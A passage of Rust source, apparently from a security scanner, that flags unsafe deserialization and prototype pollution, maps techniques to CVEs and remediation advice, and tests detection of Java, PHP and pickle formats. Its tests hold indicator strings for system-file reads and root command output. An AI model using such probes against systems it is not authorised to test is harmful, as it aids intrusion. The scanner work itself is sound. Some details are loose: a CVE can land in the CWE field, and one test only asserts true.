    /// Check for prototype pollution indicators
    fn check_pollution_indicators(&self, text: &str) -> bool {
        // Check if the polluted property is reflected
        text.contains("\"isAdmin\":true")
            || text.contains("\"admin\":true")
            || text.contains("[object Object]")
            || text.contains("undefined")
    }

    /// Create vulnerability finding
    fn create_vuln(&self, name: &str, technique: &DeserTechnique, location: &str, _response: &str) -> Vuln {
        Vuln {
            severity: technique.severity(),
            title: format!("Deserialization RCE: {} - {}", name, technique.description()),
            description: format!(
                "Unsafe deserialization vulnerability detected. \
                 {}",
                technique.description()
            ),
            location: Some(location.to_string()),
            recommendation: Some(match technique {
                DeserTechnique::JavaCommonsCollections | DeserTechnique::JavaYsoserial => {
                    "Update Apache Commons Collections to version 3.2.2+. \
                     Implement input validation. Use JEP 290 deserialization filtering. \
                     Avoid deserializing untrusted data.".to_string()
                }
                DeserTechnique::PythonPickle | DeserTechnique::PythonDill | DeserTechnique::PythonYaml => {
                    "Never unpickle untrusted data. Use JSON for serialization. \
                     Implement strict type checking. Use defusedxml for XML, yaml.safe_load for YAML.".to_string()
                }
                DeserTechnique::PhpSoapClient | DeserTechnique::PhpWakeup | DeserTechnique::PhpLaravel | DeserTechnique::PhpSymfony => {
                    "Update PHP and frameworks. Disable unserialize for user input. \
                     Use JSON instead of PHP serialization. Implement object allowlisting.".to_string()
                }
                DeserTechnique::JsonPrototypePollution => {
                    "Use Object.create(null) instead of {}. \
                     Validate JSON structure before merging. \
                     Use libraries with prototype pollution protection (e.g., lodash 4.17.11+).".to_string()
                }
                DeserTechnique::OgnlInjection => {
                    "Disable OGNL. Update Struts to 2.5.26+. \
                     Update Confluence to LTS version. \
                     Use parameterized queries and strict input validation.".to_string()
                }
                _ => "Avoid deserializing untrusted data. Use safe serialization formats like JSON. \
                     Implement strict type checking and allowlisting. Keep all libraries updated.".to_string()
            }),
            cwe: technique.cve().map(|c| c.to_string()).or(Some("CWE-502".to_string())),
            owasp: Some("A08:2021 - Software and Data Integrity Failures".to_string()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = DeserializationScanner::new(config);
        // Scanner created successfully
        assert!(true);
    }

    #[test]
    fn test_java_magic_bytes() {
        let data = &[0xAC, 0xED, 0x00, 0x05, 0x73, 0x72];
        let config = ScannerConfig::new();
        let scanner = DeserializationScanner::new(config);

        assert_eq!(
            scanner.detect_format_from_bytes(data),
            Some(SerializationFormat::JavaSerialized)
        );
    }

    #[test]
    fn test_php_patterns() {
        let config = ScannerConfig::new();
        let scanner = DeserializationScanner::new(config);

        assert_eq!(
            scanner.detect_format_from_text("O:8:\"stdClass\":0:{}"),
            SerializationFormat::PhpSerialized
        );
    }

    #[test]
    fn test_python_pickle_patterns() {
        let config = ScannerConfig::new();
        let scanner = DeserializationScanner::new(config);

        assert_eq!(
            scanner.detect_format_from_text("(dp0\nS'test'\np1\n."),
            SerializationFormat::PythonPickle
        );
    }

    #[test]
    fn test_technique_severity() {
        assert_eq!(DeserTechnique::JavaCommonsCollections.severity(), VulnSeverity::Critical);
        assert_eq!(DeserTechnique::PythonPickle.severity(), VulnSeverity::Critical);
        assert_eq!(DeserTechnique::PhpSoapClient.severity(), VulnSeverity::Critical);
        assert_eq!(DeserTechnique::JsonPrototypePollution.severity(), VulnSeverity::High);
    }

    #[test]
    fn test_cve_mapping() {
        assert_eq!(DeserTechnique::JavaCommonsCollections.cve(), Some("CVE-2015-4852"));
        assert_eq!(DeserTechnique::PhpWakeup.cve(), Some("CVE-2016-7124"));
        assert_eq!(DeserTechnique::OgnlInjection.cve(), Some("CVE-2017-5638"));
    }

    #[test]
    fn test_rce_indicators() {
        let config = ScannerConfig::new();
        let scanner = DeserializationScanner::new(config);

        assert!(scanner.check_rce_indicators("root:x:0:0"));
        assert!(scanner.check_rce_indicators("uid=0(root)"));
        assert!(scanner.check_rce_indicators("C:\\Windows\\System32"));
    }

    #[test]
    fn test_pollution_indicators() {
        let config = ScannerConfig::new();
        let scanner = DeserializationScanner::new(config);

        assert!(scanner.check_pollution_indicators("{\"isAdmin\":true}"));
    }
}
